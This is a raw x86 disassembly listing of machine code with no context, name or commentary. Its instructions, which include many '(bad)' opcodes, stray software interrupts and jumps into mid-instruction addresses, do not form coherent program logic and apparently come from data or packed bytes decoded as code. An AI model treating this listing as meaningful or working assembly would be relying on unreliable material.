  425b13:	adc    ecx,ebp
  425b15:	xchg   esi,eax
  425b16:	std    
  425b17:	int    0xa6
  425b19:	std    
  425b1a:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425b20:	cdq    
  425b21:	shl    ebx,cl
  425b23:	xchg   edx,eax
  425b24:	shl    ebp,cl
  425b26:	sub    BYTE PTR [ebx-0x2b],dl
  425b29:	int    0xa6
  425b2b:	std    
  425b2c:	cmp    edi,DWORD PTR [ecx-0x2d]
  425b2f:	mov    ebp,0xfff40492
  425b34:	shl    ebp,cl
  425b36:	sub    BYTE PTR [ebx-0x3b],dl
  425b39:	xchg   ecx,esi
  425b3b:	int    0x76
  425b3d:	adc    al,0xa
  425b3f:	int3   
  425b40:	pop    ss
  425b41:	aam    0x0
  425b43:	add    BYTE PTR [eax],al
  425b45:	int    0x8d
  425b47:	adc    al,0x4
  425b49:	add    bh,bh
  425b4b:	shl    edx,cl
  425b4d:	sub    BYTE PTR [ebx],bh
  425b4f:	jns    0x425b24
  425b51:	mov    ebp,0xcdd35392
  425b56:	(bad)  
  425b57:	std    
  425b58:	int    0x96
  425b5a:	std    
  425b5b:	add    al,0xfb
  425b5d:	(bad)  
  425b5e:	cmp    ecx,DWORD PTR [edi]
  425b60:	shr    edx,cl
  425b62:	sub    bl,dl
  425b64:	jmp    0x425af8
  425b66:	push   ebx
  425b67:	adc    ecx,ebp
  425b69:	xchg   esi,eax
  425b6a:	std    
  425b6b:	int    0xa6
  425b6d:	std    
  425b6e:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b74:	repz xchg edx,eax
  425b76:	shl    ebp,cl
  425b78:	sub    BYTE PTR [ebx-0x2b],dl
  425b7b:	xchg   DWORD PTR [ebx],edx
  425b7d:	int    0x96
  425b7f:	std    
  425b80:	int    0xa6
  425b82:	std    
  425b83:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b89:	in     eax,0x28
  425b8b:	shl    ebx,cl
  425b8d:	xchg   edx,eax
  425b8e:	push   ebx
  425b8f:	aad    0x87
  425b91:	adc    ecx,DWORD PTR [edx]
  425b93:	add    eax,0xd4cf
  425b98:	add    bh,cl
  425b9a:	push   es
  425b9b:	nop
  425b9c:	add    BYTE PTR [eax],al
  425b9e:	add    BYTE PTR [eax-0x33],dh
  425ba1:	jbe    0x425ba0
  425ba3:	int    0x8d
  425ba5:	std    
  425ba6:	sar    bh,0x63
  425ba9:	cmp    edi,DWORD PTR [ecx+0x3b]
  425bac:	or     al,0xd3
  425bae:	mov    ebp,0x28f2d392
  425bb3:	push   ebx
  425bb4:	shl    DWORD PTR [eax-0x33],cl
  425bb7:	jbe    0x425be5
  425bb9:	iret   
  425bba:	or     DWORD PTR [ecx-0x80],eax
  425bbd:	add    BYTE PTR [eax+0x3d01cd71],0x81
  425bc4:	add    BYTE PTR [eax-0x69ffb000],0x24
  425bcb:	int    0x8d
  425bcd:	push   esp
  425bce:	or     al,BYTE PTR [ecx-0x32528933]
  425bd4:	lea    esi,[ebp-0x6d82bad1]
  425bda:	shr    ebx,cl
  425bdc:	xchg   edx,eax
  425bdd:	int    0x8d
  425bdf:	lods   eax,DWORD PTR ds:[esi]
  425be0:	int    0x96
  425be2:	mov    ch,0x3b
  425be4:	leave  
  425be5:	cmp    ebx,edx
  425be7:	push   ebx
  425be8:	icebp  
  425be9:	bound  eax,QWORD PTR [eax]
  425beb:	(bad)  
  425bec:	xor    al,0xd3
  425bee:	repnz sub BYTE PTR [eax],al
  425bf1:	(bad)  
  425bf2:	inc    esp
  425bf3:	mov    ebp,0xfb94
  425bf8:	int    0x76
  425bfa:	lods   eax,DWORD PTR ds:[esi]
  425bfb:	int    0x8d
  425bfd:	mov    ch,0x2f
  425bff:	inc    ebp
  425c00:	jge    0x425b94
  425c02:	shr    ebx,cl
  425c04:	xchg   edx,eax
  425c05:	int    0x8d
  425c07:	lods   eax,DWORD PTR ds:[esi]
  425c08:	int    0x96
  425c0a:	mov    ch,0x3b
  425c0c:	leave  
  425c0d:	cmp    ebx,edx
  425c0f:	push   ebx
  425c10:	icebp  
  425c11:	bound  eax,QWORD PTR [eax]
  425c13:	(bad)  
  425c14:	push   esp
  425c15:	shl    edx,cl
  425c17:	sub    BYTE PTR [eax],al
  425c19:	(bad)  
  425c1a:	cmp    al,0xbd
  425c1c:	inc    esp
  425c1d:	sti    
  425c1e:	add    BYTE PTR [eax],al
  425c20:	int    0x76
  425c22:	std    
  425c23:	int    0x8d
  425c25:	std    
  425c26:	cmp    ecx,DWORD PTR [ebx+edx*8]
  425c29:	repnz sub BYTE PTR [ebx],bh
  425c2c:	jns    0x425c01
  425c2e:	mov    ebp,0xcdd35392
  425c33:	(bad)  
  425c34:	std    
  425c35:	int    0x96
  425c37:	std    
  425c38:	cmp    ecx,DWORD PTR [edi]
  425c3a:	shr    ebx,cl
  425c3c:	xchg   edx,eax
  425c3d:	cmp    edx,ebp
  425c3f:	shr    edx,cl
  425c41:	sub    BYTE PTR [ebx+0x13],dl
  425c44:	xchg   ebx,edx
  425c46:	int    0x8d
  425c48:	std    
  425c49:	int    0x96
  425c4b:	std    
  425c4c:	cmp    ecx,DWORD PTR [edi]
  425c4e:	shr    ebx,cl
  425c50:	xchg   edx,eax
  425c51:	cmp    edx,ebp
  425c53:	shr    edx,cl
  425c55:	sub    BYTE PTR [ebx+0x13],dl
  425c58:	xchg   ebx,edx
  425c5a:	int    0x8d
  425c5c:	std    
  425c5d:	int    0x96
  425c5f:	std    
  425c60:	cmp    ecx,DWORD PTR [edi]
  425c62:	shr    ebx,cl
  425c64:	xchg   edx,eax
  425c65:	cmp    edx,ebp
  425c67:	shr    edx,cl
  425c69:	sub    BYTE PTR [ebx+0x13],dl
  425c6c:	xchg   ebx,edx
  425c6e:	or     al,BYTE PTR [esi]
  425c70:	nop
  425c71:	add    BYTE PTR [eax],al
  425c73:	add    ch,cl
  425c75:	jbe    0x425ccb
  425c77:	int    0x80
  425c79:	int    0x8d
  425c7b:	mov    ebp,0x3bbd96cd
  425c80:	(bad)  
  425c82:	aad    0xd3
  425c84:	jmp    0x425c18
  425c86:	shr    edx,cl
  425c88:	sub    BYTE PTR [ebx+0x13],dl
  425c8b:	or     al,BYTE PTR ds:0xd4cf
  425c91:	add    ch,cl
  425c93:	jbe    0x425ce1
  425c95:	int    0x80
  425c97:	int    0x8d
  425c99:	std    
  425c9a:	int    0x96
  425c9c:	std    
  425c9d:	cmp    ecx,DWORD PTR [edi]
  425c9f:	shr    ebx,cl
  425ca1:	xchg   edx,eax
  425ca2:	int    0x6c
  425ca4:	jo     0x425ce1
  425ca6:	aad    0xd3
  425ca8:	jmp    0xcf05:0xa135328
  425caf:	aam    0x0
  425cb1:	add    BYTE PTR [eax],al
  425cb3:	int    0x76
  425cb5:	sbb    al,0xcd
  425cb7:	lea    ebx,[ebx+edi*1]
  425cba:	or     al,0xd3
  425cbc:	repnz sub BYTE PTR [ebx],bh
  425cbf:	jns    0x425c94
  425cc1:	mov    ebp,0xcdd35392
  425cc6:	(bad)  
  425cc7:	std    
  425cc8:	int    0x96
  425cca:	std    
  425ccb:	cmp    edx,ebp
  425ccd:	cmp    ecx,DWORD PTR [edi]
  425ccf:	shr    edx,cl
  425cd1:	sub    bl,dl
  425cd3:	jmp    0x425c67
  425cd5:	push   ebx
  425cd6:	adc    ecx,ebp
  425cd8:	xchg   esi,eax
  425cd9:	std    
  425cda:	int    0xa6
  425cdc:	std    
  425cdd:	cmp    ebx,DWORD PTR [ecx+0x492f3d3]
  425ce3:	hlt    
  425ce4:	call   ebx
  425ce6:	in     eax,0x28
  425ce8:	push   ebx
  425ce9:	aad    0x87
  425ceb:	adc    ecx,DWORD PTR [edx]
  425ced:	add    eax,0xd4cf
  425cf2:	add    ch,cl
  425cf4:	jbe    0x425cf3
  425cf6:	int    0x8d
  425cf8:	std    
  425cf9:	add    al,0x2
  425cfb:	call   ebx
  425cfd:	repnz sub BYTE PTR [ebx],bh
  425d00:	jns    0x425cd5
  425d02:	mov    ebp,0xcdd35392
  425d07:	(bad)  
  425d08:	std    
  425d09:	int    0x96
  425d0b:	std    
  425d0c:	add    al,0xfb
  425d0e:	(bad)  
  425d0f:	cmp    ecx,DWORD PTR [edi]
  425d11:	shr    edx,cl
  425d13:	sub    bl,dl
  425d15:	jmp    0x425ca9
  425d17:	push   ebx
  425d18:	adc    eax,DWORD PTR [edi-0x272322d]
  425d1e:	int    0x96
  425d20:	std    
  425d21:	add    al,0xfb
  425d23:	(bad)  
  425d24:	cmp    ecx,DWORD PTR [edi]
  425d26:	shr    edx,cl
  425d28:	sub    bl,dl
  425d2a:	jmp    0x425cbe
  425d2c:	push   ebx
  425d2d:	adc    ecx,edi
  425d2f:	pop    ss
  425d30:	nop
  425d31:	add    BYTE PTR [eax],al
  425d33:	add    BYTE PTR [edx-0x33],ah
  425d36:	xchg   esi,eax
  425d37:	std    
  425d38:	int    0xa6
  425d3a:	std    
  425d3b:	xchg   ebx,edx
  425d3d:	cmp    ebx,DWORD PTR [ecx+0xaa58dcf]
  425d43:	int3   
  425d44:	push   es
  425d45:	aam    0x0
  425d47:	add    BYTE PTR [eax],al
  425d49:	int    0x76
  425d4b:	sub    al,0x4
  425d4d:	hlt    
  425d4e:	call   ebx
  425d50:	repz xchg edx,eax
  425d52:	shl    ebp,cl
  425d54:	sub    BYTE PTR [ebx-0x2b],dl
  425d57:	iret   
  425d58:	or     edi,ebp
  425d5a:	add    BYTE PTR [eax+0x3d01cd80],0x81
  425d61:	add    BYTE PTR [eax+0x50007162],0x0
  425d68:	xchg   esi,eax
  425d69:	and    al,0x6
  425d6b:	ins    DWORD PTR es:[edi],dx
  425d6c:	aam    0xbc
  425d6e:	int    0x76
  425d70:	in     eax,dx
  425d71:	int    0x8d
  425d73:	adc    DWORD PTR [edi],ebp
  425d75:	inc    ebp
  425d76:	jge    0x425d0a
  425d78:	shr    ebx,cl
  425d7a:	xchg   edx,eax
  425d7b:	int    0xe3
  425d7d:	int    0x7d
  425d7f:	int    0x76
  425d81:	in     eax,dx
  425d82:	int    0x96
  425d84:	adc    DWORD PTR [ebx],edi
  425d86:	fidivr DWORD PTR [ebx]
  425d88:	lock shr DWORD PTR [ebp+0x4c76cd28],cl
  425d8f:	push   ebx
  425d90:	adc    ecx,ebp
  425d92:	xor    BYTE PTR [ebx-0x76],al
  425d95:	jo     0x425d64
  425d97:	xchg   esi,eax
  425d98:	push   esp
  425d99:	in     al,dx
  425d9a:	push   esp
  425d9b:	int    0x92
  425d9d:	int    0xa6
  425d9f:	push   eax
  425da0:	retf   0x5324
  425da3:	or     DWORD PTR [eax+ecx*4],esp
  425da6:	int    0x76
  425da8:	cmc    
  425da9:	int    0x8d
  425dab:	stc    
  425dac:	das    
  425dad:	inc    ebp
  425dae:	jge    0x425d42
  425db0:	shr    ebx,cl
  425db2:	xchg   edx,eax
  425db3:	int    0x8d
  425db5:	cmc    
  425db6:	int    0xa6
  425db8:	stc    
  425db9:	cmp    ecx,ecx
  425dbb:	cmp    ebx,ebp
  425dbd:	shl    edx,cl
  425dbf:	sub    ch,cl
  425dc1:	lea    esi,[eax]
  425dc3:	push   ebx
  425dc4:	lds    eax,FWORD PTR [edi+0x4c76cd7d]
  425dca:	int    0x1c
  425dcc:	inc    ebx
  425dcd:	(bad)  
  425dce:	jo     0x425dda
  425dd0:	lea    esi,[eax]
  425dd2:	or     cl,0xec
  425dd5:	xchg   ch,cl
  425dd7:	xchg   esi,eax
  425dd8:	push   esp
  425dd9:	int    0x76
  425ddb:	dec    esp
  425ddc:	int    0x4a
  425dde:	int    0x20
  425de0:	xchg   DWORD PTR [esi-0x32e3f59c],ebx
  425de6:	sbb    al,0xcd
  425de8:	dec    edx
  425de9:	xchg   ebp,ecx
  425deb:	sub    eax,0xa808080
  425df0:	lea    esi,[eax]
  425df2:	int    0x4a
  425df4:	int    0xa6
  425df6:	push   eax
  425df7:	xor    ecx,DWORD PTR [ecx*8+0x530a88a6]
  425dfe:	int    0x80
  425e00:	int    0x4a
  425e02:	xchg   DWORD PTR [esp+edi*1-0x33],edi
  425e06:	jbe    0x425df5
  425e08:	or     cl,BYTE PTR [ebp+0x118dcd0d]
  425e0e:	das    
  425e0f:	inc    ebp
  425e10:	jge    0x425da4
  425e12:	shr    ebx,cl
  425e14:	xchg   edx,eax
  425e15:	int    0x8d
  425e17:	in     eax,dx
  425e18:	int    0xa6
  425e1a:	adc    DWORD PTR [ebx],edi
  425e1c:	leave  
  425e1d:	cmp    ebx,ebp
  425e1f:	shl    edx,cl
  425e21:	sub    BYTE PTR [ebx-0x3b],dl
  425e24:	or     dh,BYTE PTR [esi+0x44]
  425e27:	int    0x76
  425e29:	xor    bl,ch
  425e2b:	les    eax,FWORD PTR [ecx+0x76cd8080]
  425e31:	in     eax,dx
  425e32:	int    0x8d
  425e34:	adc    DWORD PTR [edi],ebp
  425e36:	inc    ebp
  425e37:	jge    0x425dcb
  425e39:	shr    ebx,cl
  425e3b:	xchg   edx,eax
  425e3c:	int    0x8d
  425e3e:	in     eax,dx
  425e3f:	int    0xa6
  425e41:	adc    ebx,edx
  425e43:	repnz sub ch,cl
  425e46:	lea    edx,[ebx+edi*1]
  425e49:	leave  
  425e4a:	cmp    ebx,ebp
  425e4c:	add    al,0xd3
  425e4e:	stc    
  425e4f:	push   ebx
  425e50:	(bad)
  425e53:	inc    ebx
  425e54:	shr    DWORD PTR [edi],cl
  425e56:	add    al,0xf7
  425e58:	add    BYTE PTR [eax+0x30a6cd80],0xcf
  425e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e60:	dec    ebx
  425e61:	mov    BYTE PTR [ebx],dh
  425e63:	jge    0x425e6f
  425e65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e66:	xor    al,0xa
  425e68:	lea    edi,[ecx*8+0x76cdf18d]
  425e6f:	xchg   ebp,eax
  425e70:	das    
  425e71:	inc    ebp
  425e72:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e78:	jbe    0x425e6b
  425e7a:	int    0xa6
  425e7c:	xchg   ebp,eax
  425e7d:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e83:	cmp    esi,eax
  425e85:	cmp    ebx,ebp
  425e87:	push   ebx
  425e88:	or     al,0xcd
  425e8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e8b:	stc    
  425e8c:	das    
  425e8d:	inc    ebp
  425e8e:	popf   
  425e8f:	xchg   edx,eax
  425e90:	or     dh,BYTE PTR [esi+0x54]
  425e93:	int    0x76
  425e95:	cmc    
  425e96:	push   ecx
  425e97:	out    0x54,al
  425e99:	add    al,0xd3
  425e9b:	dec    edx
  425e9c:	shr    esp,cl
  425e9e:	xchg   edx,eax
  425e9f:	int    0xa6
  425ea1:	stc    
  425ea2:	cmp    ebx,ebp
  425ea4:	mov    DWORD PTR [esi+0x54b6d554],esp
  425eaa:	int    0xa6
  425eac:	cmc    
  425ead:	int    0x8d
  425eaf:	stc    
  425eb0:	das    
  425eb1:	inc    ebp
  425eb2:	or     al,0x92
  425eb4:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425eba:	shr    ebx,cl
  425ebc:	xchg   edx,eax
  425ebd:	int    0x8d
  425ebf:	stc    
  425ec0:	cmp    ecx,ebx
  425ec2:	shr    DWORD PTR [ebp+0x5476cd28],cl
  425ec8:	cmp    esp,ecx
  425eca:	push   ebx
  425ecb:	fcmovne st,st(5)
  425ecd:	lea    esi,[edi+ebp*1]
  425ed0:	mov    ebx,0x2bc53389
  425ed5:	ror    ebp,cl
  425ed7:	(bad)  
  425ed8:	icebp  
  425ed9:	or     dh,BYTE PTR [esi+0x54]
  425edc:	int    0x76
  425ede:	xchg   ebp,eax
  425edf:	das    
  425ee0:	inc    ebp
  425ee1:	rcl    DWORD PTR [edx-0x326d422d],cl
  425ee7:	jbe    0x425eda
  425ee9:	int    0xa6
  425eeb:	xchg   ebp,eax
  425eec:	shr    DWORD PTR [ebp+0x3476cd28],cl
  425ef2:	das    
  425ef3:	mov    ebx,0xa6020180
  425ef8:	cmp    ebx,ebp
  425efa:	dec    edx
  425efb:	or     al,0x1
  425efd:	ror    DWORD PTR [edx-0x2b],cl
  425f00:	mov    ebp,0xbdbfcb3b
  425f05:	or     ah,BYTE PTR [ebx]
  425f07:	and    eax,0x92d3352f
  425f0c:	shr    DWORD PTR [ebp+0x37d65692],cl
  425f12:	ficom  WORD PTR [ebx]
  425f14:	cmp    ecx,DWORD PTR [esi+eiz*2]
  425f17:	fidiv  WORD PTR [edi]
  425f19:	ficom  WORD PTR [ebx]
  425f1b:	(bad)  
  425f1c:	ss inc ebx
  425f1e:	or     al,0xd6
  425f20:	cs int 0x92
  425f23:	int    0x8d
  425f25:	xor    BYTE PTR [edi+0x548dcd81],al
  425f2b:	add    al,0x64
  425f2d:	mov    BYTE PTR [eax-0x6d32ce2c],al
  425f33:	int    0x8d
  425f35:	xor    BYTE PTR [edi-0x7772327f],al
  425f3b:	xchg   DWORD PTR [esi+0x54],esi
  425f3e:	int    0x89
  425f40:	or     DWORD PTR [eax-0x6dcb89fc],0x2f3c8d00
  425f4a:	push   es
  425f4b:	and    eax,DWORD PTR [eax]
  425f4d:	add    BYTE PTR [eax],al
  425f4f:	in     al,dx
  425f50:	test   DWORD PTR [edi+0x25230abd],edi
  425f56:	int    0x76
  425f58:	adc    al,0x81
  425f5a:	jbe    0x425fa0
  425f5c:	leave  
  425f5d:	jbe    0x425fcc
  425f5f:	scas   al,BYTE PTR es:[edi]
  425f60:	aaa    
  425f61:	ficom  WORD PTR [ebx]
  425f63:	or     ah,BYTE PTR [esi+0x6d76cd75]
  425f69:	int    0x8d
  425f6b:	jne    0x425f9c
  425f6d:	inc    ebp
  425f6e:	jge    0x425f02
  425f70:	shr    ebx,cl
  425f72:	xchg   edx,eax
  425f73:	int    0x8d
  425f75:	ins    DWORD PTR es:[edi],dx
  425f76:	int    0xa6
  425f78:	jne    0x425f4d
  425f7a:	repnz sub ch,cl
  425f7d:	lea    ecx,[ebp+ecx*8-0x77]
  425f81:	cmp    ecx,ecx
  425f83:	cmp    ebx,ebp
  425f85:	push   ebx
  425f86:	(bad)
  425f89:	shl    esp,cl
  425f8b:	int    0x8d
  425f8d:	inc    esp
  425f8e:	inc    ebx
  425f8f:	mov    BYTE PTR [edi+0x54],dh
  425f92:	int    0x76
  425f94:	xor    BYTE PTR [edi+0x760a1476],al
  425f9a:	xor    ch,cl
  425f9c:	ins    BYTE PTR es:[edi],dx
  425f9d:	test   BYTE PTR [edx],cl
  425f9f:	jbe    0x425fb5
  425fa1:	int    0x76
  425fa3:	in     eax,dx
  425fa4:	int    0x8d
  425fa6:	adc    DWORD PTR [edi],ebp
  425fa8:	inc    ebp
  425fa9:	jge    0x425f3d
  425fab:	shr    ebx,cl
  425fad:	xchg   edx,eax
  425fae:	int    0x8d
  425fb0:	in     eax,dx
  425fb1:	int    0xa6
  425fb3:	adc    DWORD PTR [ebx],edi
  425fb5:	fnstsw WORD PTR [ebx]
  425fb7:	leave  
  425fb8:	push   ebx
  425fb9:	(bad)
  425fbc:	sub    BYTE PTR [esi+0x76],bl
  425fbf:	adc    al,0x2f
  425fc1:	push   es
  425fc2:	mov    esi,0xcd0000ff
  425fc7:	(bad)  
  425fc8:	std    
  425fc9:	int    0x96
  425fcb:	std    
  425fcc:	cmp    ecx,DWORD PTR [edi]
  425fce:	shr    ebx,cl
  425fd0:	xchg   edx,eax
  425fd1:	sar    bh,0x9c
  425fd4:	cmp    esi,ecx
  425fd6:	shr    edx,cl
  425fd8:	sub    BYTE PTR [ebx+0x13],dl
  425fdb:	int    0x96
  425fdd:	std    
  425fde:	int    0xa6
  425fe0:	std    
  425fe1:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425fe7:	popf   
  425fe8:	shl    ebp,cl
  425fea:	sub    BYTE PTR [ebx-0x2b],dl
  425fed:	xchg   DWORD PTR [ebx],edx
  425fef:	int    0x96
  425ff1:	std    
  425ff2:	int    0xa6
  425ff4:	std    
  425ff5:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425ffb:	popf   
  425ffc:	shl    ebp,cl
  425ffe:	sub    BYTE PTR [ebx-0x2b],dl
  426001:	xchg   DWORD PTR [ebx],edx
  426003:	int    0x96
  426005:	std    
  426006:	int    0xa6
  426008:	std    
  426009:	cmp    ebx,DWORD PTR [ecx-0xc2c62c5]
  42600f:	xchg   edx,eax
  426010:	shl    ebp,cl
  426012:	sub    BYTE PTR [ebx-0x2b],dl
  426015:	xchg   DWORD PTR [ebx],edx
  426017:	or     cl,bh
  426019:	nop
  42601a:	add    BYTE PTR [eax],al
  42601c:	add    ch,cl
  42601e:	lea    edx,[eax-0x33]
  426021:	xchg   esi,eax
  426022:	mov    ebp,0x3bbda6cd
  426027:	cdq    
  426028:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  42602e:	in     eax,0x28
  426030:	push   ebx
  426031:	aad    0xa
  426033:	int3   
  426034:	pop    ss
  426035:	aam    0x0
  426037:	add    BYTE PTR [eax],al
  426039:	int    0x8d
  42603b:	dec    esp
  42603c:	int    0x89
  42603e:	int    0x96
  426040:	std    
  426041:	int    0xa6
  426043:	std    
  426044:	int    0x7e
  426046:	jo     0x426083
  426048:	cdq    
  426049:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  42604f:	in     eax,0x28
  426051:	push   ebx
  426052:	aad    0xa
  426054:	int3   
  426055:	pop    ss
  426056:	aam    0x0
  426058:	add    BYTE PTR [eax],al
  42605a:	int    0x8d
  42605c:	sbb    al,0xcd
  42605e:	xchg   esi,eax
  42605f:	sbb    al,0x3b
  426061:	icebp  
  426062:	shr    edx,cl
  426064:	sub    BYTE PTR [ebx],bh
  426066:	psrlq  mm5,mm3
  426069:	xchg   edx,eax
  42606a:	push   ebx
  42606b:	adc    ecx,ebp
  42606d:	xchg   esi,eax
  42606e:	std    
  42606f:	int    0xa6
  426071:	std    
  426072:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  426078:	cdq    
  426079:	shl    ebp,cl
  42607b:	sub    bl,dl
  42607d:	repz xchg edx,eax
  42607f:	push   ebx
  426080:	aad    0xcd
  426082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426083:	std    
  426084:	cmp    edi,DWORD PTR [ecx+0x4]
  426087:	hlt    
  426088:	call   ebx
  42608a:	mov    ebp,0x28e5d392
  42608f:	push   ebx
  426090:	lds    eax,FWORD PTR [edi+0x17cc0af1]
  426096:	aam    0x0
  426098:	add    BYTE PTR [eax],al
  42609a:	int    0x8d
  42609c:	std    
  42609d:	int    0x96
  42609f:	std    
  4260a0:	cmp    ecx,DWORD PTR [edi]
  4260a2:	shr    ebx,cl
  4260a4:	xchg   edx,eax
  4260a5:	sar    bh,0x9c
  4260a8:	cmp    esi,ecx
  4260aa:	shr    edx,cl
  4260ac:	sub    BYTE PTR [ebx+0x13],dl
  4260af:	int    0x96
  4260b1:	std    
  4260b2:	int    0xa6
  4260b4:	std    
  4260b5:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4260bb:	popf   
  4260bc:	shl    ebp,cl
  4260be:	sub    BYTE PTR [ebx-0x2b],dl
  4260c1:	xchg   DWORD PTR [ebx],edx
  4260c3:	int    0x96
  4260c5:	std    
  4260c6:	int    0xa6
  4260c8:	std    
  4260c9:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4260cf:	popf   
  4260d0:	shl    ebp,cl
  4260d2:	sub    BYTE PTR [ebx-0x2b],dl
  4260d5:	xchg   DWORD PTR [ebx],edx
  4260d7:	iret   
  4260d8:	xchg   esi,eax
  4260d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260da:	or     dl,BYTE PTR ds:0xd4cf
  4260e0:	add    bh,cl
  4260e2:	iret   
  4260e3:	nop
  4260e4:	add    BYTE PTR [eax],al
  4260e6:	add    BYTE PTR [ecx-0x33],dh
  4260e9:	(bad)  
  4260ea:	std    
  4260eb:	int    0x96
  4260ed:	std    
  4260ee:	cmp    ecx,DWORD PTR [edi]
  4260f0:	int    0xd6
  4260f2:	sub    al,0x3b
  4260f4:	icebp  
  4260f5:	shr    ebx,cl
  4260f7:	xchg   edx,eax
  4260f8:	shr    edx,cl
  4260fa:	sub    BYTE PTR [ebx+0x13],dl
  4260fd:	jno    0x4260ce
  4260ff:	pop    es
  426100:	out    dx,eax
  426101:	add    BYTE PTR [eax+0x7cd7080],0x3d
  426108:	add    DWORD PTR [eax+0x500080],0x7cd2496
  426112:	add    DWORD PTR [ecx+0x760a8080],eax
  426118:	dec    esp
  426119:	int    0x76
  42611b:	mov    ch,cl
  42611d:	mov    BYTE PTR [edi-0x72f5b373],al
  426123:	dec    esp
  426124:	int    0x8d
  426126:	cmc    
  426127:	int    0x96
  426129:	stc    
  42612a:	das    
  42612b:	inc    ebp
  42612c:	jecxz  0x4260c0
  42612e:	shl    ebx,cl
  426130:	xchg   edx,eax
  426131:	int    0x96
  426133:	cmc    
  426134:	int    0xd6
  426136:	stc    
  426137:	cmp    esi,edi
  426139:	shr    edx,cl
  42613b:	sub    ch,cl
  42613d:	xchg   esi,eax
  42613e:	cmc    
  42613f:	cmp    esi,eax
  426141:	push   ebx
  426142:	bswap  ebp
  426144:	(bad)  
  426145:	stc    
  426146:	das    
  426147:	inc    ebp
  426148:	sti    
  426149:	xchg   edx,eax
  42614a:	shr    edi,cl
  42614c:	xchg   edx,eax
  42614d:	int    0xd6
  42614f:	cmc    
  426150:	int    0xa6
  426152:	stc    
  426153:	cmp    ebx,ecx
  426155:	cmp    ebx,ebp
  426157:	push   ebx
  426158:	aad    0x87
  42615a:	adc    ecx,ebp
  42615c:	xchg   esi,eax
  42615d:	cmc    
  42615e:	sar    DWORD PTR [ecx-0x62932d8],cl
  426164:	das    
  426165:	inc    ebp
  426166:	sti    
  426167:	xchg   edx,eax
  426168:	shr    edi,cl
  42616a:	xchg   edx,eax
  42616b:	int    0xd6
  42616d:	cmc    
  42616e:	int    0xa6
  426170:	stc    
  426171:	cmp    ebx,ecx
  426173:	cmp    ebx,ebp
  426175:	push   ebx
  426176:	aad    0x87
  426178:	adc    ecx,ebp
  42617a:	xchg   esi,eax
  42617b:	cmc    
  42617c:	sar    DWORD PTR [ecx-0x62932d8],cl
  426182:	das    
  426183:	inc    ebp
  426184:	sti    
  426185:	xchg   edx,eax
  426186:	shr    edi,cl
  426188:	xchg   edx,eax
  426189:	int    0xd6
  42618b:	cmc    
  42618c:	cmp    ebx,ecx
  42618e:	int    0xe6
  426190:	stc    
  426191:	cmp    eax,DWORD PTR [eax]
  426193:	push   ebx
  426194:	fld    DWORD PTR [edi+0x707113]
  42619a:	(bad)  
  42619b:	dec    esp
  42619c:	sar    DWORD PTR [ecx-0x12c242d8],cl
  4261a2:	add    BYTE PTR [eax],al
  4261a4:	int    0x76
  4261a6:	or     eax,0xcb63a8aa
  4261ab:	rcl    BYTE PTR [eax-0x80],cl
  4261ae:	xchg   esi,eax
  4261af:	int    0xed
  4261b1:	add    al,0xed
  4261b3:	inc    esp
  4261b4:	pop    ebx
  4261b5:	cwde   
  4261b6:	call   0x76c9:0xcb3bdd3b
  4261bd:	popf   
  4261be:	(bad)  
  4261bf:	aaa    
  4261c0:	ficom  WORD PTR [ebx]
  4261c2:	pop    ebp
  4261c3:	mov    ebp,0xa25230a
  4261c8:	jbe    0x42616f
  4261ca:	leave  
  4261cb:	jbe    0x42618a
  4261cd:	xchg   ecx,eax
  4261ce:	aaa    
  4261cf:	ficom  WORD PTR [ebx]
  4261d1:	or     dh,BYTE PTR [esi-0x13]
  4261d4:	leave  
  4261d5:	jbe    0x4261c4
  4261d7:	dec    ecx
  4261d8:	mov    al,ds:0x76c93586
  4261dd:	cmc    
  4261de:	dec    ecx
  4261df:	lahf   
  4261e0:	xchg   BYTE PTR ds:0x691176c9,dh
  4261e6:	and    DWORD PTR [esi+0x1176c935],eax
  4261ec:	cmp    DWORD PTR [ecx],esp
  4261ee:	xchg   BYTE PTR ds:0x49f976c9,dh
  4261f4:	and    DWORD PTR [ebp+esi*1+0xa8476cf],eax
  4261fb:	jbe    0x4261f6
  4261fd:	int    0x76
  4261ff:	sbb    al,0xcd
  426201:	shl    BYTE PTR ds:0xcd808081,1
  426207:	jbe    0x426225
  426209:	int    0x8d
  42620b:	sbb    al,0xcd
  42620d:	add    DWORD PTR ds:0xcd808081,ebp
  426213:	xor    ch,cl
  426215:	pop    esp
  426216:	xchg   eax,esp
  426218:	fs int 0x96
  42621b:	popf   
  42621c:	int    0xa
  42621e:	and    eax,0xa808081
  426223:	out    0xb5,al
  426225:	int    0xe6
  426227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426228:	das    
  426229:	inc    ebp
  42622a:	add    edx,DWORD PTR [edx-0x326def2d]
  426230:	out    0x9d,al
  426232:	int    0xa6
  426234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426235:	adc    bh,bl
  426237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426238:	mov    esi,0xdd3b4229
  42623d:	shr    ecx,cl
  42623f:	sub    ch,cl
  426241:	pop    esi
  426242:	push   ebx
  426243:	aad    0x43
  426245:	(bad)  
  426247:	nop
  426248:	int    0x18
  42624a:	or     dl,BYTE PTR [esi+0x1496cdf9]
  426250:	int    0x96
  426252:	xor    ch,cl
  426254:	xchg   esi,eax
  426255:	dec    esp
  426256:	iret   
  426257:	xchg   esi,eax
  426258:	lods   eax,DWORD PTR ds:[esi]
  426259:	bound  eax,QWORD PTR [eax]
